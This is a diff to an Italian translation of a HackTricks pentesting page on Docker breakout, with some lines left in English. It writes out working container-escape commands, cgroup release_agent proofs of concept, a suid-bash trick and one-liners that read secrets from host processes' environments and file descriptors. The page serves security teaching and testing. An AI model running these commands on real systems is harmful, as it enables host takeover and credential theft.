@@ -1,16 +1,16 @@
-# Docker Breakout / Escalazione dei Privilegi
+# Docker Breakout / Privilege Escalation
 
 {% hint style="success" %}
-Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Impara e pratica Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Sostieni HackTricks</summary>
+<summary>Supporta HackTricks</summary>
 
 * Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
 
 </details>
 {% endhint %}
@@ -18,22 +18,22 @@ Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" d
 <figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) per costruire facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti della comunità più avanzati al mondo.\
-Ottieni l'accesso oggi:
+Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) per costruire e **automatizzare flussi di lavoro** facilmente grazie agli **strumenti** della comunità **più avanzati** al mondo.\
+Ottieni accesso oggi:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}
 
 ## Enumerazione Automatica & Fuga
 
 * [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Può anche **enumerare i container**
-* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Questo strumento è abbastanza **utile per enumerare il container in cui ti trovi e provare a fuggire automaticamente**
-* [**amicontained**](https://github.com/genuinetools/amicontained): Strumento utile per ottenere i privilegi che il container ha al fine di trovare modi per fuggirne
+* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Questo strumento è piuttosto **utile per enumerare il container in cui ti trovi e persino provare a fuggire automaticamente**
+* [**amicontained**](https://github.com/genuinetools/amicontained): Strumento utile per ottenere i privilegi che il container ha per trovare modi per fuggire da esso
 * [**deepce**](https://github.com/stealthcopter/deepce): Strumento per enumerare e fuggire dai container
-* [**grype**](https://github.com/anchore/grype): Ottieni i CVE contenuti nel software installato nell'immagine
+* [**grype**](https://github.com/anchore/grype): Ottieni le CVE contenute nel software installato nell'immagine
 
 ## Fuga dal Socket Docker Montato
 
-Se in qualche modo scopri che il **socket docker è montato** all'interno del container docker, sarai in grado di fuggirne.\
+Se in qualche modo scopri che il **socket docker è montato** all'interno del container docker, sarai in grado di fuggire da esso.\
 Questo di solito accade nei container docker che per qualche motivo devono connettersi al demone docker per eseguire azioni.
 ```bash
 #Search the socket
@@ -55,13 +55,13 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
 {% hint style="info" %}
-Nel caso in cui il **socket di Docker si trovi in un posto inaspettato**, è comunque possibile comunicare con esso utilizzando il comando **`docker`** con il parametro **`-H unix:///percorso/a/docker.sock`**
+Nel caso in cui il **docker socket si trovi in un posto inaspettato**, puoi comunque comunicare con esso utilizzando il comando **`docker`** con il parametro **`-H unix:///path/to/docker.sock`**
 {% endhint %}
 
-Il demone Docker potrebbe anche essere [in ascolto su una porta (di default 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) o nei sistemi basati su Systemd, la comunicazione con il demone Docker può avvenire tramite il socket Systemd `fd://`.
+Il daemon Docker potrebbe anche [ascoltare su una porta (di default 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) o su sistemi basati su Systemd, la comunicazione con il daemon Docker può avvenire tramite il socket Systemd `fd://`.
 
 {% hint style="info" %}
-Inoltre, prestare attenzione ai socket di runtime di altri runtime di alto livello:
+Inoltre, presta attenzione ai socket di runtime di altri runtime di alto livello:
 
 * dockershim: `unix:///var/run/dockershim.sock`
 * containerd: `unix:///run/containerd/containerd.sock`
@@ -71,23 +71,23 @@ Inoltre, prestare attenzione ai socket di runtime di altri runtime di alto livel
 * ...
 {% endhint %}
 
-## Fuga dall'Abuso delle Capacità
+## Abuso delle Capacità per l'Evasione
 
-Dovresti controllare le capacità del container, se ha una qualsiasi delle seguenti, potresti essere in grado di evadere da esso: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
+Dovresti controllare le capacità del container, se ha alcune delle seguenti, potresti essere in grado di evadere: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
-Puoi controllare le capacità attuali del container utilizzando **gli strumenti automatici precedentemente menzionati** o:
+Puoi controllare le capacità attuali del container utilizzando **strumenti automatici precedentemente menzionati** o:
 ```bash
 capsh --print
 ```
-Nella seguente pagina puoi **saperne di più sulle capacità di Linux** e su come abusarne per evadere/aumentare i privilegi:
+In the following page you can **learn more about linux capabilities** and how to abuse them to escape/escalate privileges:
 
 {% content-ref url="../../linux-capabilities.md" %}
 [linux-capabilities.md](../../linux-capabilities.md)
 {% endcontent-ref %}
 
-## Fuga da Container Privilegiati
+## Escape from Privileged Containers
 
-Un container privilegiato può essere creato con il flag `--privileged` o disabilitando specifiche difese:
+Un contenitore privilegiato può essere creato con il flag `--privileged` o disabilitando specifiche difese:
 
 * `--cap-add=ALL`
 * `--security-opt apparmor=unconfined`
@@ -97,9 +97,9 @@ Un container privilegiato può essere creato con il flag `--privileged` o disabi
 * `--userns=host`
 * `--uts=host`
 * `--cgroupns=host`
-* `Montare /dev`
+* `Mount /dev`
 
-Il flag `--privileged` abbassa significativamente la sicurezza del container, offrendo **accesso illimitato ai dispositivi** e aggirando **diverse protezioni**. Per una panoramica dettagliata, consulta la documentazione sugli impatti completi di `--privileged`.
+Il flag `--privileged` riduce significativamente la sicurezza del contenitore, offrendo **accesso illimitato ai dispositivi** e bypassando **diverse protezioni**. Per una spiegazione dettagliata, fare riferimento alla documentazione sugli impatti completi di `--privileged`.
 
 {% content-ref url="../docker-privileged.md" %}
 [docker-privileged.md](../docker-privileged.md)
@@ -107,23 +107,23 @@ Il flag `--privileged` abbassa significativamente la sicurezza del container, of
 
 ### Privileged + hostPID
 
-Con questi permessi puoi semplicemente **passare allo spazio dei nomi di un processo in esecuzione nell'host come root** come init (pid:1) eseguendo: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
+Con questi permessi puoi semplicemente **passare allo spazio dei nomi di un processo in esecuzione nell'host come root** come init (pid:1) eseguendo semplicemente: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
 
-Provalo in un container eseguendo:
+Testalo in un contenitore eseguendo:
 ```bash
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
 ### Privileged
 
-Solo con il flag privilegiato puoi provare ad **accedere al disco dell'host** o provare a **scappare abusando di release\_agent o di altre falle**.
+Con il flag privilegiato puoi provare ad **accedere al disco dell'host** o provare a **fuggire abusando di release\_agent o altri metodi di fuga**.
 
 Testa i seguenti bypass in un container eseguendo:
 ```bash
 docker run --rm -it --privileged ubuntu bash
 ```
-#### Montaggio del disco - Poc1
+#### Montaggio Disco - Poc1
 
-I container Docker ben configurati non permetteranno comandi come **fdisk -l**. Tuttavia, su un comando Docker mal configurato in cui viene specificato il flag `--privileged` o `--device=/dev/sda1` con le capacità, è possibile ottenere i privilegi per visualizzare il drive dell'host.
+Container docker ben configurati non permetteranno comandi come **fdisk -l**. Tuttavia, su comandi docker mal configurati dove è specificato il flag `--privileged` o `--device=/dev/sda1` con i permessi, è possibile ottenere i privilegi per vedere il disco host.
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
@@ -132,11 +132,11 @@ Quindi, per prendere il controllo della macchina host, è banale:
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
-Ecco a te! Ora puoi accedere al filesystem dell'host perché è montato nella cartella `/mnt/hola`.
+E voilà! Ora puoi accedere al filesystem dell'host perché è montato nella cartella `/mnt/hola`.
 
 #### Montaggio Disco - Poc2
 
-All'interno del container, un attaccante potrebbe tentare di ottenere ulteriore accesso al sistema operativo sottostante dell'host tramite un volume hostPath scrivibile creato dal cluster. Di seguito sono riportate alcune cose comuni che puoi controllare all'interno del container per vedere se puoi sfruttare questo vettore dell'attaccante:
+All'interno del container, un attaccante potrebbe tentare di ottenere ulteriore accesso al sistema operativo host sottostante tramite un volume hostPath scrivibile creato dal cluster. Di seguito ci sono alcune cose comuni che puoi controllare all'interno del container per vedere se puoi sfruttare questo vettore di attacco:
 ```bash
 ### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
@@ -157,9 +157,9 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
-#### Fuga di privilegi sfruttando l'agent di rilascio esistente ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
+#### Privileged Escape Abusando dell'esistente release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
 
-{% code title="PoC iniziale" %}
+{% code title="Initial PoC" %}
 ```bash
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -195,9 +195,9 @@ cat /o
 ```
 {% endcode %}
 
-#### Fuga di privilegi sfruttando il release_agent creato ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+#### Privileged Escape Abusando di release\_agent creato ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
 
-{% code title="Secondo PoC" %}
+{% code title="Seconda PoC" %}
 ```bash
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -241,15 +241,15 @@ cat /output
 ```
 {% endcode %}
 
-Trova una **spiegazione della tecnica** in:
+Trova un **spiegazione della tecnica** in:
 
 {% content-ref url="docker-release_agent-cgroups-escape.md" %}
 [docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
 {% endcontent-ref %}
 
-#### Fuga privilegiata sfruttando release\_agent senza conoscere il percorso relativo - PoC3
+#### Privileged Escape Abusando release\_agent senza conoscere il percorso relativo - PoC3
 
-Nei precedenti exploit viene **rivelato il percorso assoluto del container all'interno del filesystem dell'host**. Tuttavia, questo non è sempre il caso. Nei casi in cui **non si conosce il percorso assoluto del container all'interno dell'host** è possibile utilizzare questa tecnica:
+Negli exploit precedenti il **percorso assoluto del container all'interno del filesystem dell'host è rivelato**. Tuttavia, questo non è sempre il caso. Nei casi in cui **non conosci il percorso assoluto del container all'interno dell'host** puoi utilizzare questa tecnica:
 
 {% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
 [release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
@@ -313,7 +313,7 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
-Eseguire il PoC all'interno di un container privilegiato dovrebbe fornire un output simile a:
+Eseguire il PoC all'interno di un contenitore privilegiato dovrebbe fornire un output simile a:
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -341,10 +341,10 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
-#### Fuga di privilegi sfruttando i mount sensibili
+#### Privileged Escape Abusing Sensitive Mounts
 
-Ci sono diversi file che potrebbero essere montati che forniscono **informazioni sull'host sottostante**. Alcuni di essi potrebbero addirittura indicare **qualcosa da eseguire dall'host quando accade qualcosa** (il che permetterà a un attaccante di fuggire dal container).\
-L'abuso di questi file potrebbe permettere che:
+Ci sono diversi file che potrebbero essere montati che forniscono **informazioni sull'host sottostante**. Alcuni di essi potrebbero persino indicare **qualcosa da eseguire da parte dell'host quando accade qualcosa** (il che consentirà a un attaccante di uscire dal container).\
+L'abuso di questi file potrebbe consentire che:
 
 * release\_agent (già trattato in precedenza)
 * [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
@@ -358,16 +358,16 @@ Tuttavia, puoi trovare **altri file sensibili** da controllare in questa pagina:
 [sensitive-mounts.md](sensitive-mounts.md)
 {% endcontent-ref %}
 
-### Mount arbitrari
+### Arbitrary Mounts
 
-In diverse occasioni potresti scoprire che il **container ha alcuni volumi montati dall'host**. Se questo volume non è stato configurato correttamente, potresti essere in grado di **accedere/modificare dati sensibili**: Leggere segreti, cambiare ssh authorized\_keys...
+In diverse occasioni scoprirai che il **container ha qualche volume montato dall'host**. Se questo volume non è stato configurato correttamente, potresti essere in grado di **accedere/modificare dati sensibili**: leggere segreti, cambiare ssh authorized\_keys…
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
-### Escalation dei privilegi con 2 shell e mount dell'host
+### Privilege Escalation con 2 shell e mount dell'host
 
-Se hai accesso come **root all'interno di un container** che ha una cartella dell'host montata e sei **scappato come utente non privilegiato sull'host** e hai accesso in lettura sulla cartella montata.\
-Puoi creare un **file bash suid** nella **cartella montata** all'interno del **container** e **eseguirlo dall'host** per ottenere privilegi elevati.
+Se hai accesso come **root all'interno di un container** che ha una cartella dell'host montata e hai **escapato come utente non privilegiato nell'host** e hai accesso in lettura sulla cartella montata.\
+Puoi creare un **file bash suid** nella **cartella montata** all'interno del **container** e **eseguirlo dall'host** per privesc.
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -375,14 +375,14 @@ chown root:root bash #From container as root inside mounted folder
 chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
 ```
-### Escalation dei privilegi con 2 shell
+### Privilege Escalation with 2 shells
 
-Se hai accesso come **root all'interno di un container** e sei **scappato come utente non privilegiato all'host**, puoi abusare di entrambe le shell per **escalare i privilegi all'interno dell'host** se hai la capacità MKNOD all'interno del container (è di default) come [**spiegato in questo post**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
-Con tale capacità, all'utente root all'interno del container è consentito **creare file di dispositivo a blocchi**. I file di dispositivo sono file speciali utilizzati per **accedere all'hardware sottostante e ai moduli del kernel**. Ad esempio, il file di dispositivo a blocchi /dev/sda fornisce accesso per **leggere i dati grezzi sul disco del sistema**.
+Se hai accesso come **root all'interno di un container** e hai **escapato come utente non privilegiato all'host**, puoi abusare di entrambe le shell per **privesc all'interno dell'host** se hai la capacità MKNOD all'interno del container (è di default) come [**spiegato in questo post**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
+Con tale capacità, l'utente root all'interno del container è autorizzato a **creare file di dispositivo a blocchi**. I file di dispositivo sono file speciali utilizzati per **accedere all'hardware sottostante e ai moduli del kernel**. Ad esempio, il file di dispositivo a blocchi /dev/sda consente di **leggere i dati grezzi sul disco del sistema**.
 
-Docker protegge dall'abuso dei dispositivi a blocchi all'interno dei container applicando una politica cgroup che **blocca le operazioni di lettura/scrittura sui dispositivi a blocchi**. Tuttavia, se un dispositivo a blocchi viene **creato all'interno del container**, diventa accessibile dall'esterno del container tramite la directory **/proc/PID/root/**. Questo accesso richiede che il **proprietario del processo sia lo stesso** sia all'interno che all'esterno del container.
+Docker protegge contro l'uso improprio dei dispositivi a blocchi all'interno dei container imponendo una politica cgroup che **blocca le operazioni di lettura/scrittura sui dispositivi a blocchi**. Tuttavia, se un dispositivo a blocchi viene **creato all'interno del container**, diventa accessibile dall'esterno del container tramite la directory **/proc/PID/root/**. Questo accesso richiede che **il proprietario del processo sia lo stesso** sia all'interno che all'esterno del container.
 
-Esempio di **sfruttamento** da questo [**articolo**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
+**Esempio di sfruttamento** da questo [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
 ```bash
 # On the container as root
 cd /
@@ -424,9 +424,9 @@ Se puoi accedere ai processi dell'host, sarai in grado di accedere a molte infor
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
-Per esempio, sarai in grado di elencare i processi utilizzando qualcosa del genere `ps auxn` e cercare dettagli sensibili nei comandi.
+Ad esempio, sarai in grado di elencare i processi utilizzando qualcosa come `ps auxn` e cercare dettagli sensibili nei comandi.
 
-Quindi, poiché puoi **accedere a ciascun processo dell'host in /proc/, puoi semplicemente rubare i loro segreti dell'ambiente** eseguendo:
+Poi, poiché puoi **accedere a ciascun processo dell'host in /proc/ puoi semplicemente rubare i loro segreti ambientali** eseguendo:
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
 /proc/988058/environ
@@ -435,7 +435,7 @@ HOSTNAME=argocd-server-69678b4f65-6mmql
 USER=abrgocd
 ...
 ```
-Puoi anche **accedere ai descrittori file di altri processi e leggere i file aperti da essi**:
+Puoi anche **accedere ai descrittori di file di altri processi e leggere i loro file aperti**:
 ```bash
 for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
 less fds.txt
@@ -445,85 +445,85 @@ lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
 # You can open the secret filw with:
 cat /proc/635813/fd/4
 ```
-Puoi anche **uccidere processi e causare un DoS**.
+Puoi anche **terminare processi e causare un DoS**.
 
 {% hint style="warning" %}
-Se in qualche modo hai **accesso privilegiato su un processo al di fuori del container**, potresti eseguire qualcosa come `nsenter --target <pid> --all` o `nsenter --target <pid> --mount --net --pid --cgroup` per **eseguire una shell con le stesse restrizioni ns** (sperabilmente nessuna) **di quel processo.**
+Se in qualche modo hai **accesso privilegiato su un processo al di fuori del container**, potresti eseguire qualcosa come `nsenter --target <pid> --all` o `nsenter --target <pid> --mount --net --pid --cgroup` per **eseguire una shell con le stesse restrizioni ns** (si spera nessuna) **di quel processo.**
 {% endhint %}
 
 ### hostNetwork
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-Se un container è configurato con il driver di rete host di Docker (`--network=host`), lo stack di rete di quel container non è isolato dall'host Docker (il container condivide lo spazio dei nomi di rete dell'host) e al container non viene assegnato un proprio indirizzo IP. In altre parole, il **container associa tutti i servizi direttamente all'IP dell'host**. Inoltre, il container può **intercettare TUTTO il traffico di rete che l'host** sta inviando e ricevendo sull'interfaccia condivisa `tcpdump -i eth0`.
+Se un contenitore è stato configurato con il driver di rete Docker [host networking (`--network=host`)](https://docs.docker.com/network/host/), lo stack di rete di quel contenitore non è isolato dall'host Docker (il contenitore condivide lo spazio dei nomi di rete dell'host) e il contenitore non riceve un proprio indirizzo IP. In altre parole, il **contenitore lega tutti i servizi direttamente all'IP dell'host**. Inoltre, il contenitore può **intercettare TUTTO il traffico di rete che l'host** sta inviando e ricevendo sull'interfaccia condivisa `tcpdump -i eth0`.
 
-Ad esempio, è possibile utilizzare questo metodo per **intercettare e persino falsificare il traffico** tra l'host e l'istanza dei metadati.
+Ad esempio, puoi utilizzare questo per **sniffare e persino spoofare il traffico** tra l'host e l'istanza di metadata.
 
 Come nei seguenti esempi:
 
-* [Articolo: Come contattare Google SRE: Ottenere una shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
-* [MITM del servizio dei metadati consente l'escalation dei privilegi di root (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
+* [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
+* [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
 
-Sarà anche possibile accedere ai **servizi di rete associati a localhost** all'interno dell'host o persino accedere alle **autorizzazioni dei metadati del nodo** (che potrebbero essere diverse da quelle a cui un container può accedere).
+Sarai anche in grado di accedere ai **servizi di rete legati a localhost** all'interno dell'host o persino accedere alle **permissive di metadata del nodo** (che potrebbero essere diverse da quelle a cui un contenitore può accedere).
 
 ### hostIPC
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
-Con `hostIPC=true`, si ottiene accesso alle risorse di comunicazione inter-processo (IPC) dell'host, come la **memoria condivisa** in `/dev/shm`. Ciò consente la lettura/scrittura dove le stesse risorse IPC sono utilizzate da altri processi dell'host o del pod. Utilizzare `ipcs` per ispezionare ulteriormente questi meccanismi IPC.
+Con `hostIPC=true`, ottieni accesso alle risorse di comunicazione inter-processo (IPC) dell'host, come **memoria condivisa** in `/dev/shm`. Questo consente di leggere/scrivere dove le stesse risorse IPC sono utilizzate da altri processi dell'host o del pod. Usa `ipcs` per ispezionare ulteriormente questi meccanismi IPC.
 
 * **Ispeziona /dev/shm** - Cerca eventuali file in questa posizione di memoria condivisa: `ls -la /dev/shm`
-* **Ispeziona le strutture IPC esistenti** - È possibile verificare se vengono utilizzate strutture IPC con `/usr/bin/ipcs`. Controlla con: `ipcs -a`
+* **Ispeziona le strutture IPC esistenti** – Puoi controllare se ci sono strutture IPC in uso con `/usr/bin/ipcs`. Controllalo con: `ipcs -a`
 
-### Recupera le capacità
+### Recupera capacità
 
-Se la chiamata di sistema **`unshare`** non è vietata, è possibile recuperare tutte le capacità eseguendo:
+Se la syscall **`unshare`** non è vietata, puoi recuperare tutte le capacità eseguendo:
 ```bash
 unshare -UrmCpf bash
 # Check them with
 cat /proc/self/status | grep CapEff
 ```
-### Abuso dello spazio utente tramite symlink
+### Abuso del namespace utente tramite symlink
 
-La seconda tecnica spiegata nel post [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indica come è possibile abusare dei bind mounts con i namespace utente, per influenzare i file all'interno dell'host (in quel caso specifico, eliminare file).
+La seconda tecnica spiegata nel post [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indica come puoi abusare dei bind mount con i namespace utente, per influenzare i file all'interno dell'host (in quel caso specifico, eliminare file).
 
 <figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Utilizza [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) per costruire facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti della comunità più avanzati al mondo.\
-Ottieni l'accesso oggi:
+Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) per costruire e **automatizzare flussi di lavoro** alimentati dagli **strumenti comunitari più avanzati** al mondo.\
+Ottieni accesso oggi:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}
 
 ## CVE
 
-### Exploit di Runc (CVE-2019-5736)
+### Exploit Runc (CVE-2019-5736)
 
-Nel caso in cui tu possa eseguire `docker exec` come root (probabilmente con sudo), puoi provare a elevare i privilegi sfuggendo da un container abusando di CVE-2019-5736 (exploit [qui](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Questa tecnica sovrascriverà essenzialmente il binario _**/bin/sh**_ dell'**host** **da un container**, quindi chiunque esegua docker exec potrebbe attivare il payload.
+Nel caso tu possa eseguire `docker exec` come root (probabilmente con sudo), prova a elevare i privilegi fuggendo da un container abusando di CVE-2019-5736 (exploit [qui](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Questa tecnica sovrascriverà fondamentalmente il _**/bin/sh**_ binario dell'**host** **da un container**, quindi chiunque esegua docker exec può attivare il payload.
 
-Modifica il payload di conseguenza e compila il main.go con `go build main.go`. Il binario risultante dovrebbe essere posizionato nel container Docker per l'esecuzione.\
-All'esecuzione, non appena visualizza `[+] Sovrascritto /bin/sh con successo`, è necessario eseguire quanto segue dalla macchina host:
+Cambia il payload di conseguenza e costruisci il main.go con `go build main.go`. Il binario risultante dovrebbe essere posizionato nel container docker per l'esecuzione.\
+All'esecuzione, non appena visualizza `[+] Overwritten /bin/sh successfully` devi eseguire il seguente comando dalla macchina host:
 
-`docker exec -it <nome-container> /bin/sh`
+`docker exec -it <container-name> /bin/sh`
 
 Questo attiverà il payload presente nel file main.go.
 
 Per ulteriori informazioni: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
 {% hint style="info" %}
-Il container potrebbe essere vulnerabile anche ad altre CVE, puoi trovare un elenco su [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
+Ci sono altre CVE a cui il container può essere vulnerabile, puoi trovare un elenco in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
 {% endhint %}
 
-## Fuga personalizzata da Docker
+## Escape Personalizzato di Docker
 
-### Superficie di fuga di Docker
+### Superficie di Escape di Docker
 
-* **Namespace:** Il processo dovrebbe essere **completamente separato dagli altri processi** tramite namespace, quindi non possiamo sfuggire interagendo con altri processi a causa dei namespace (per impostazione predefinita non può comunicare tramite IPC, socket Unix, servizi di rete, D-Bus, `/proc` di altri processi).
+* **Namespaces:** Il processo dovrebbe essere **completamente separato da altri processi** tramite namespaces, quindi non possiamo fuggire interagendo con altri procs a causa dei namespaces (per impostazione predefinita non possono comunicare tramite IPC, socket unix, servizi di rete, D-Bus, `/proc` di altri procs).
 * **Utente root**: Per impostazione predefinita, l'utente che esegue il processo è l'utente root (tuttavia i suoi privilegi sono limitati).
-* **Capacità**: Docker lascia le seguenti capacità: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
-* **Syscall**: Questi sono i syscall che l'**utente root non potrà chiamare** (a causa della mancanza di capacità + Seccomp). Gli altri syscall potrebbero essere utilizzati per cercare di sfuggire.
+* **Capabilities**: Docker lascia le seguenti capabilities: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
+* **Syscalls**: Queste sono le syscalls che l'**utente root non sarà in grado di chiamare** (a causa della mancanza di capabilities + Seccomp). Le altre syscalls potrebbero essere utilizzate per provare a fuggire.
 
 {% tabs %}
-{% tab title="x64 syscalls" %}
+{% tab title="syscalls x64" %}
 ```yaml
 0x067 -- syslog
 0x070 -- setsid
@@ -546,7 +546,7 @@ Il container potrebbe essere vulnerabile anche ad altre CVE, puoi trovare un ele
 ```
 {% endtab %}
 
-{% tab title="chiamate di sistema arm64" %}
+{% tab title="syscall arm64" %}
 ```
 0x029 -- pivot_root
 0x059 -- acct
@@ -566,21 +566,7 @@ Il container potrebbe essere vulnerabile anche ad altre CVE, puoi trovare un ele
 ```
 {% endtab %}
 
-{% tab title="syscall_bf.c" %} 
-
-## Docker Breakout Privilege Escalation
-
-### Overview
-
-This repository contains a proof of concept exploit for escaping a Docker container and escalating privileges to root on the host system. The exploit takes advantage of a misconfigured Docker container that allows a user to mount the host's root filesystem and modify sensitive files.
-
-### Usage
-
